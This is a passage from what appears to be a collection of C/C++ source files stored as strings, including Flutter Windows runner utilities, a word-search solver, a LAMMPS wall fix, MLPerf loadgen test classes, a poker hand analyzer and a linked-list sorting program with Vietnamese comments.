WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include <vector>\n#include <string>\n\nusing namespace std;\n\nclass Solution {\npublic:\n    bool dfs(vector<vector<char>>& board, string word, int row, int column, int wordindex) {\n        if (wordindex == word.length()) {\n            return true;\n        }\n        int r = board.size();\n        int c = board[0].size();\n        if (row < 0 || column < 0 || row >= r || column >= c) {\n            return false;\n        }\n        if (board[row][column] == '#' || board[row][column] != word[wordindex]) {\n            return false;\n        }\n        char ch = board[row][column];\n        board[row][column] = '#';\n        if (dfs(board, word, row - 1, column, wordindex + 1) ||\n            dfs(board, word, row, column + 1, wordindex + 1) ||\n            dfs(board, word, row + 1, column, wordindex + 1) ||\n            dfs(board, word, row, column - 1, wordindex + 1)) {\n            return true;\n        }\n        board[row][column] = ch;\n        return false;\n    }\n    \n    bool exist(vector<vector<char>>& board, string word) {\n        for (int r = 0; r < board.size(); r++) {\n            for (int c = 0; c < board[0].size(); c++) {\n                if (board[r][c] == word[0]) {\n                    if (dfs(board, word, r, c, 0)) {\n                        return true;\n                    }\n                }\n            }\n        }\n        return false;\n    }\n};\n",
    "/* ----------------------------------------------------------------------\n   LAMMPS - Large-scale Atomic/Molecular Massively Parallel Simulator\n   http://lammps.sandia.gov, Sandia National Laboratories\n   Steve Plimpton, sjplimp@sandia.gov\n\n   Copyright (2003) Sandia Corporation.  Under the terms of Contract\n   DE-AC04-94AL85000 with Sandia Corporation, the U.S. Government retains\n   certain rights in this software.  This software is distributed under\n   the GNU General Public License.\n\n   See the README file in the top-level LAMMPS directory.\n\n   Modified by Olav Galteland, olav.galteland@ntnu.no\n   Reflective particle method: 10.1103/PhysRevE.57.7259\n------------------------------------------------------------------------- */\n\n#include <stdlib.h>\n#include <string.h>\n#include \"fix_wall_rpm.h\"\n#include \"atom.h\"\n#include \"comm.h\"\n#include \"update.h\"\n#include \"modify.h\"\n#include \"domain.h\"\n#include \"lattice.h\"\n#include \"input.h\"\n#include \"variable.h\"\n#include \"error.h\"\n#include \"force.h\"\n\nusing namespace LAMMPS_NS;\nusing namespace FixConst;\n\nenum{XLO=0,XHI=1,YLO=2,YHI=3,ZLO=4,ZHI=5};\nenum{NONE=0,EDGE,CONSTANT,VARIABLE};\n\n/* ---------------------------------------------------------------------- */\n\nFixWallRPM::FixWallRPM(LAMMPS *lmp, int narg, char **arg) :\n  Fix(lmp, narg, arg),\n  nwall(0),\n  rng(lmp, 987334)\n{\n  if (narg < 4) error->all(FLERR,\"Illegal fix wall/rpm command\");\n\n  // parse args\n\n  nwall = 0;\n  int scaleflag = 1;\n  //p = atof(arg[3]);\n\n  int iarg = 3;\n  while (iarg < narg) {\n    if ((strcmp(arg[iarg],\"xlo\") == 0) || (strcmp(arg[iarg],\"xhi\") == 0) ||\n        (strcmp(arg[iarg],\"ylo\") == 0) || (strcmp(arg[iarg],\"yhi\") == 0) ||\n        (strcmp(arg[iarg],\"zlo\") == 0) || (strcmp(arg[iarg],\"zhi\") == 0)) {\n      if (iarg+3 > narg) error->all(FLERR,\"Illegal fix wall/rpm command\");\n\n      int newwall;\n      if (strcmp(arg[iarg],\"xlo\") == 0) newwall = XLO;\n      else if (strcmp(arg[iarg],\"xhi\") == 0) newwall = XHI;\n      else if (strcmp(arg[iarg],\"ylo\") == 0) newwall = YLO;\n      else if (strcmp(arg[iarg],\"yhi\") == 0) newwall = YHI;\n      else if (strcmp(arg[iarg],\"zlo\") == 0) newwall = ZLO;\n      else if (strcmp(arg[iarg],\"zhi\") == 0) newwall = ZHI;\n\n      for (int m = 0; (m < nwall) && (m < 6); m++)\n        if (newwall == wallwhich[m])\n          error->all(FLERR,\"Wall defined twice in fix wall/rpm command\");\n\n      wallwhich[nwall] = newwall;\n      if (strcmp(arg[iarg+1],\"EDGE\") == 0) {\n        wallstyle[nwall] = EDGE;\n        int dim = wallwhich[nwall] / 2;\n        int side = wallwhich[nwall] % 2;\n        if (side == 0) coord0[nwall] = domain->boxlo[dim];\n        else coord0[nwall] = domain->boxhi[dim];\n      } else if (strstr(arg[iarg+1],\"v_\") == arg[iarg+1]) {\n        wallstyle[nwall] = VARIABLE;\n        int n = strlen(&arg[iarg+1][2]) + 1;\n        varstr[nwall] = new char[n];\n        strcpy(varstr[nwall],&arg[iarg+1][2]);\n      } else {\n        wallstyle[nwall] = CONSTANT;\n        coord0[nwall] = utils::numeric(FLERR,arg[iarg+1],false,lmp);\n      }\n        \n      // Only allow for one p TODO: One p for each wall\n      p = atof(arg[iarg+2]);\n      nwall++;\n      iarg += 3;\n\n    } else if (strcmp(arg[iarg],\"units\") == 0) {\n      if (iarg+2 > narg) error->all(FLERR,\"Illegal wall/rpm command\");\n      if (strcmp(arg[iarg+1],\"box\") == 0) scaleflag = 0;\n      else if (strcmp(arg[iarg+1],\"lattice\") == 0) scaleflag = 1;\n      else error->all(FLERR,\"Illegal fix wall/rpm command\");\n      iarg += 2;\n    } else error->all(FLERR,\"Illegal fix wall/rpm command\");\n  }\n\n  // error check\n\n  if (nwall == 0) error->all(FLERR,\"Illegal fix wall command\");\n    \n  // Why not?\n  /*\n  for (int m = 0; m < nwall; m++) {\n    if ((wallwhich[m] == XLO || wallwhich[m] == XHI) && domain->xperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n    if ((wallwhich[m] == YLO || wallwhich[m] == YHI) && domain->yperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n    if ((wallwhich[m] == ZLO || wallwhich[m] == ZHI) && domain->zperiodic)\n      error->all(FLERR,\"Cannot use fix wall/rpm in periodic dimension\");\n  }\n  */\n\n  for (int m = 0; m < nwall; m++)\n    if ((wallwhich[m] == ZLO || wallwhich[m] == ZHI) && domain->dimension == 2)\n      error->all(FLERR,\n                 \"Cannot use fix wall/rpm zlo/zhi for a 2d simulation\");\n\n  // scale factors for CONSTANT and VARIABLE walls\n\n  int flag = 0;\n  for (int m = 0; m < nwall; m++)\n    if (wallstyle[m] != EDGE) flag = 1;\n\n  if (flag) {\n    if (scaleflag) {\n      xscale = domain->lattice->xlattice;\n      yscale = domain->lattice->ylattice;\n      zscale = domain->lattice->zlattice;\n    }\n    else xscale = yscale = zscale = 1.0;\n\n    for (int m = 0; m < nwall; m++) {\n      if (wallstyle[m] != CONSTANT) continue;\n      if (wallwhich[m] < YLO) coord0[m] *= xscale;\n      else if (wallwhich[m] < ZLO) coord0[m] *= yscale;\n      else coord0[m] *= zscale;\n    }\n  }\n\n  // set varflag if any wall positions are variable\n\n  varflag = 0;\n  for (int m =",
    "/*\n * Copyright (c) 2020, NVIDIA CORPORATION.  All rights reserved.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *     http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n#include <cassert>\n#include <condition_variable>\n#include <deque>\n#include <iostream>\n#include <map>\n#include <mutex>\n#include <thread>\n#include <vector>\n\n#include \"loadgen.h\"\n#include \"query_sample_library.h\"\n#include \"system_under_test.h\"\n#include \"test_settings.h\"\n\nclass QSL : public mlperf::QuerySampleLibrary {\n public:\n  ~QSL() override{};\n  const std::string& Name() override { return mName; }\n  size_t TotalSampleCount() override { return 1000000; }\n  size_t PerformanceSampleCount() override { return TotalSampleCount(); }\n  void LoadSamplesToRam(\n      const std::vector<mlperf::QuerySampleIndex>& samples) override {}\n  void UnloadSamplesFromRam(\n      const std::vector<mlperf::QuerySampleIndex>& samples) override {}\n\n private:\n  std::string mName{\"Dummy QSL\"};\n};\n\nclass BasicSUT : public mlperf::SystemUnderTest {\n public:\n  BasicSUT() {\n    // Start with some large value so that we don't reallocate memory.\n    initResponse(10000);\n  }\n  ~BasicSUT() override {}\n  const std::string& Name() override { return mName; }\n  void IssueQuery(const std::vector<mlperf::QuerySample>& samples) override {\n    int n = samples.size();\n    if (n > mResponses.size()) {\n      std::cerr << \"Warning: reallocating response buffer in BasicSUT. Maybe \"\n                   \"you should initResponse with larger value!?\"\n                << std::endl;\n      initResponse(samples.size());\n    }\n    for (int i = 0; i < n; i++) {\n      mResponses[i].id = samples[i].id;\n    }\n    mlperf::QuerySamplesComplete(mResponses.data(), n);\n  }\n  void FlushQueries() override {}\n\n private:\n  void initResponse(int size) {\n    mResponses.resize(size,\n                      {0, reinterpret_cast<uintptr_t>(&mBuf), sizeof(int)});\n  }\n  int mBuf{0};\n  std::string mName{\"BasicSUT\"};\n  std::vector<mlperf::QuerySampleResponse> mResponses;\n};\n\nclass QueueSUT : public mlperf::SystemUnderTest {\n public:\n  QueueSUT(int numCompleteThreads, int maxSize) {\n    // Each thread handle at most maxSize at a time.\n    std::cout << \"QueueSUT: maxSize = \" << maxSize << std::endl;\n    initResponse(numCompleteThreads, maxSize);\n    // Launch complete threads\n    for (int i = 0; i < numCompleteThreads; i++) {\n      mThreads.emplace_back(&QueueSUT::CompleteThread, this, i);\n    }\n  }\n  ~QueueSUT() override {\n    {\n      std::unique_lock<std::mutex> lck(mMtx);\n      mDone = true;\n      mCondVar.notify_all();\n    }\n    for (auto& thread : mThreads) {\n      thread.join();\n    }\n  }\n  const std::string& Name() override { return mName; }\n  void IssueQuery(const std::vector<mlperf::QuerySample>& samples) override {\n    std::unique_lock<std::mutex> lck(mMtx);\n    for (const auto& sample : samples) {\n      mIdQueue.push_back(sample.id);\n    }\n    // Let some worker thread to consume tasks\n    mCondVar.notify_one();\n  }\n  void FlushQueries() override {}\n\n private:\n  void CompleteThread(int threadIdx) {\n    auto& responses = mResponses[threadIdx];\n    size_t maxSize{responses.size()};\n    size_t actualSize{0};\n    while (true) {\n      {\n        std::unique_lock<std::mutex> lck(mMtx);\n        mCondVar.wait(lck, [&]() { return !mIdQueue.empty() || mDone; });\n\n        if (mDone) {\n          break;\n        }\n\n        actualSize = std::min(maxSize, mIdQueue.size());\n        for (int i = 0; i < actualSize; i++) {\n          responses[i].id = mIdQueue.front();\n          mIdQueue.pop_front();\n        }\n        mCondVar.notify_one();\n      }\n      mlperf::QuerySamplesComplete(responses.data(), actualSize);\n    }\n  }\n  void initResponse(int numCompleteThreads, int size) {\n    mResponses.resize(numCompleteThreads);\n    for (auto& responses : mResponses) {\n      responses.resize(size,\n                       {0, reinterpret_cast<uintptr_t>(&mBuf), sizeof(int)});\n    }\n  }\n  int mBuf{0};\n  std::string mName{\"QueueSUT\"};\n  std::vector<std::vector<mlperf::QuerySampleResponse>> mResponses;\n  std::vector<std::thread> mThreads;\n  std::deque<mlperf::ResponseId> mIdQueue;\n  std::mutex mMtx;\n  std::condition_variable mCondVar;\n  bool mDone{false};\n};\n\nclass MultiBasicSUT : public mlperf::SystemUnderTest {\n public:\n  MultiBasicSUT(int numThreads)\n      : mNumThreads(numThreads), mResponses(numThreads) {\n    // Start with some large value so that we don't reallocate memory.\n    initResponse(10000);\n    for (int i = 0; i < mNumThreads; ++i) {\n      mThreads.emplace_back(&MultiBasicSUT::startIss",
    "#include <iostream>\n#include <vector>\n#include <array>\n#include <algorithm>\n#include \"HandAnalyzer.h\"\n\nusing namespace std;\n\nusing Hand = array<std::array<bool, 4>, 13>;\n\nstd::ostream& operator<<(std::ostream& os, const HandAnalyzer::PokerHand& obj) {\n    switch((int)obj.rank) {\n        case (int)HandAnalyzer::HandRank::RoyalFlush:\n            os << \"Royal Flush\\n\";\n            break;\n        case (int)HandAnalyzer::HandRank::StraightFlush:\n            os << \"Straight Flush\\n\";\n            break;\n        case (int)HandAnalyzer::HandRank::FourOfAKind:\n            os << \"Four of a Kind\\n\";\n            break;\n        case (int)HandAnalyzer::HandRank::FullHouse:\n            os << \"Full House\\n\";\n            break;\n        case(int) HandAnalyzer::HandRank::Flush:\n            os << \"Flush\\n\";\n            break;\n        case (int)HandAnalyzer::HandRank::Straight:\n            os << \"Straight\\n\";\n            break;\n        case (int)HandAnalyzer::HandRank::ThreeOfAKind:\n            os << \"Three of a Kind\\n\";\n            break;\n        case (int)HandAnalyzer::HandRank::TwoPairs:\n            os << \"Two Pair\\n\";\n            break;\n        case (int)HandAnalyzer::HandRank::OnePair:\n            os << \"One Pair\\n\";\n            break;\n        case (int)HandAnalyzer::HandRank::HighCard:\n            os << \"High Card\\n\";\n            break;\n    }\n    os << \"Values: \";\n    for(Card card: obj.values) {\n        cout << card << \", \";\n    }\n    os << \"\\n\";\n    os << \"Kickers: \";\n    for(Card card: obj.kickers) {\n        cout << card << \", \";\n    }\n    os << \"\\n\";\n    return os;\n}\n\nbool HandAnalyzer::PokerHand::operator<(const PokerHand& other) const {\n    if(rank < other.rank) {\n        return true;\n    }\n    if(rank > other.rank) {\n        return false;\n    }\n    for(int i = 0; i < values.size(); i++) {\n        if(values[i] != other.values[i]) {\n            return values[i] < other.values[i];\n        }\n    }\n    for(int i = 0; i < kickers.size(); i++) {\n        if(kickers[i] != other.kickers[i]) {\n            return kickers[i] < other.kickers[i];\n        }\n    }\n    return false;\n}\n\nbool HandAnalyzer::PokerHand::operator==(const PokerHand& other) const {\n    if(rank != other.rank) {\n        return false;\n    }\n    for(int i = 0; i < values.size(); i++) {\n        if(values[i].rank != other.values[i].rank) {\n            return false;\n        }\n    }\n    for(int i = 0; i < kickers.size(); i++) {\n        if(kickers[i].rank != other.kickers[i].rank) {\n            return false;\n        }\n    }\n    return true;\n}\n\nHandAnalyzer::PokerHand HandAnalyzer::getBestPokerHand(const vector<Card>& cards) {\n\n    Hand hand;\n    for(int i = 0; i < 13; i++) {\n        for(int j = 0; j < 4; j++) {\n            hand[i][j] = false;\n        }\n    }\n    for(Card card: cards) {\n        hand[(int)card.rank][(int)card.suit] = true;\n    }\n\n    //check for royal/straight flush\n    for(int lowest = 9; lowest >= 0; lowest--) {\n        for(int suit = 0; suit < 4; suit++) {\n            HandAnalyzer::PokerHand temporaryHand;\n            bool isOk = true;\n            for(int rank = lowest; rank < lowest + 5 && isOk; rank++) {\n                isOk &= hand[rank % 13][suit];\n                if(isOk) {\n                    temporaryHand.values.push_back((Card){(Rank)(rank % 13), (Suit)suit});\n                }\n            }\n            if(isOk) {\n                reverse(temporaryHand.values.begin(), temporaryHand.values.end());\n                if(lowest == 9) {\n                    temporaryHand.rank = HandAnalyzer::HandRank::RoyalFlush;\n                } else {\n                    temporaryHand.rank = HandAnalyzer::HandRank::StraightFlush;\n                }\n                return temporaryHand;\n            }\n        }\n    }\n\n    //check for four of a kind\n    for(int rank = 13; rank >= 1; rank--) {\n        HandAnalyzer::PokerHand temporaryHand;\n        bool isOk = true;\n        for(int suit = 0; suit < 4 && isOk; suit++) {\n            isOk &= hand[rank % 13][suit];\n            if(isOk) {\n                temporaryHand.values.push_back((Card){(Rank)(rank % 13), (Suit)suit});\n            }\n        }\n        if(isOk) {\n            temporaryHand.rank = HandAnalyzer::HandRank::FourOfAKind;\n            for(int rank2 = 13; rank2 >= 1; rank2--) if(rank != rank2){\n                for(int suit = 0; suit < 4; suit++) {\n                    if(hand[rank2 % 13][suit]) {\n                        temporaryHand.kickers.push_back((Card){(Rank)(rank2 % 13), (Suit)suit});\n                        return temporaryHand;\n                    }\n                }\n            }\n            return temporaryHand;\n        }\n    }\n\n    //check for full house\n    for(int rank1 = 13; rank1 >= 1; rank1--) {\n        vector<Card> instances;\n        for(int suit = 0; suit < 4; suit++) {\n            if(hand[rank1 % 13][suit]) {\n                instances.push_back((Card){(Rank)(rank1 % 13), (Suit)suit});\n            }\n        }\n        if(instances.size() != 3)\n            continue;\n        for(int rank2 = 13; rank",
    "#include <iostream>\nusing namespace std;\n\nstruct Node {\n    int data;\n    Node* next;\n    Node* prev;\n};\n\nNode* createNode(int value) {\n    Node* newNode = new Node();\n    newNode->data = value;\n    newNode->next = NULL;\n    newNode->prev = NULL;\n    return newNode;\n}\n\n//! Ham nhap danh sach\nvoid input(Node*& head, Node*& tail, int n)\n{\n    cout << \"\\n=> Nhap gia tri cua danh sach: \" << endl;\n    for (int i = 0; i < n; i++)\n    {\n        int value;\n        cout << \"Node [\" << i << \"] = \";\n        cin >> value;\n        Node* newNode = createNode(value);\n        if (head == NULL) {\n            head = tail = newNode;\n        } else {\n            tail->next = newNode;\n            newNode->prev = tail;\n            tail = newNode;\n        }\n    }\n}\n\n//! Ham xuat danh sach\nvoid output(Node* head)\n{\n    cout << \"[ \";\n    Node* current = head;\n    while (current != NULL)\n    {\n        cout << current->data << \" \";\n        current = current->next;\n    }\n    cout << \"]\" << endl;\n}\n\n//! Ham sap xep danh sach\n// Insertion sort\nvoid insertionSort(Node* head)\n{\n    if (!head || !head->next)\n        return;\n\n    Node *i, *j;\n    for (i = head->next; i != NULL; i = i->next)\n    {\n        int key = i->data;\n        j = i->prev;\n        while (j != NULL && j->data > key)\n        {\n            j->next->data = j->data;\n            j = j->prev;\n        }\n        if (j == NULL)\n            head->data = key;\n        else\n            j->next->data = key;\n    }\n}\n\n// Selection sort\nvoid selectionSort(Node* head)\n{\n    if (!head || !head->next)\n        return;\n\n    Node *i, *j;\n    for (i = head; i->next != NULL; i = i->next)\n    {\n        Node* min = i;\n        for (j = i->next; j != NULL; j = j->next)\n        {\n            if (j->data < min->data)\n                min = j;\n        }\n        if (min != i)\n            swap(min->data, i->data);\n    }\n}\n\n// Interchange sort\nvoid interchangeSort(Node* head)\n{\n    if (!head || !head->next)\n        return;\n\n    Node* i, *j;\n    for (i = head; i->next != NULL; i = i->next)\n    {\n        for (j = i->next; j != NULL; j = j->next)\n        {\n            if (i->data > j->data)\n            {\n                swap(i->data, j->data);\n            }\n        }\n    }\n}\n\n\n// Bubble sort\nvoid bubbleSort(Node* head)\n{\n    if (!head || !head->next)\n        return;\n\n    bool swapped;\n    Node *ptr1, *lptr = NULL;\n    do {\n        swapped = false;\n        ptr1 = head;\n        while (ptr1->next != lptr) {\n            if (ptr1->data > ptr1->next->data) {\n                swap(ptr1->data, ptr1->next->data);\n                swapped = true;\n            }\n            ptr1 = ptr1->next;\n        }\n        lptr = ptr1;\n    } while (swapped);\n}\n\nvoid quickSort(Node* head, Node* tail) {\n    if (head != NULL && tail != NULL && head != tail && head->prev != tail) {\n        Node* pivot = head;\n        Node* left = head->next;\n        Node* right = tail;\n\n        while (left != right && right->next != left) {\n            while (left->data < pivot->data)\n                left = left->next;\n            while (right->data > pivot->data)\n                right = right->prev;\n\n            if (left != right && right->next != left) {\n                swap(left->data, right->data);\n            }\n        }\n\n        swap(pivot->data, right->data);\n        quickSort(head, right->prev);\n        quickSort(right->next, tail);\n    }\n}\n\nint binarySearch(Node* head, int Y) {\n    Node* left = head;\n    Node* right = NULL;\n    while (right == NULL || right != left) {\n        Node* mid = left;\n        int count = 0;\n        while (mid != right && count < 2) {\n            mid = mid->next;\n            count++;\n        }\n\n        if (mid->data == Y)\n            return mid->data;\n\n        if (mid->data < Y)\n            left = mid->next;\n        else\n            right = mid;\n    }\n\n    return -1;\n}\n\n\nint main()\n{\n    system(\"cls\");\n\n    int n;\n    int Y;\n    int choice;\n    Node* head = NULL;\n    Node* tail = NULL;\n\n    while (true)\n    {\n        cout << \" -=- CHUONG TRINH SAP XEP DANH SACH LIEN KET KEP -=- \" << endl;\n        cout << \"====================================================\" << endl;\n        cout << \"=  1. Chen phan tu vao danh sach.                 =\" << endl;\n        cout << \"=--------------------------------------------------=\" << endl;\n        cout << \"=  2. Insertion sort                               =\" << endl;\n        cout << \"=  3. Selection sort                               =\" << endl;\n        cout << \"=  4. Intercange sort                              =\" << endl;\n        cout << \"=  5. Bubble sort                                  =\" << endl;\n        cout << \"=  6. Quicksort                                    =\" << endl;\n        cout << \"=--------------------------------------------------=\" << endl;\n        cout << \"=  7. Xuat danh sach vua nhap                      =\" << endl;\n        cout << \"=--------------------------------------------------=\" << endl;\n        cout << \"=  8. Tim kiem nhi phan                            =\" <<",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  